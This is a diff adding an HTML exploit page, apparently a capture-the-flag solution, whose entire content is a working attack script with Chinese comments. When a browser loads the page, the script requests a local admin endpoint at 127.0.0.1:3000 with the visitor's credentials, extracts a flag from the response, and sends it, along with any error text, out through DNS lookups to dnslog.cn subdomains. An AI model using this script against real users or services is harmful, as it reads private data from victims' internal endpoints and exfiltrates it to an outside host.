@@ -1,0 +1,19 @@
+<!-- exploit.html -->
+<script>
+  (async () => {
+    try {
+      // 关键：请求靶机本地的 admin 接口
+      const res = await fetch('http://127.0.0.1:3000/admin', { credentials: 'include' });
+      const data = await res.json();
+      let flag = data.flag || 'no-flag';
+      // 清理为合法 DNS 子域名
+      flag = flag.replace(/[^a-zA-Z0-9]/g, '-').substring(0, 60);
+      // 外带
+      new Image().src = 'http://' + flag + '.mfvewv.dnslog.cn';
+    } catch (e) {
+      // 外带错误（用于调试）
+      const err = ('ERR:' + e.message).replace(/[^a-zA-Z0-9]/g, '-').substring(0, 50);
+      new Image().src = 'http://' + err + '.aop8r0.dnslog.cn';
+    }
+  })();
+</script>
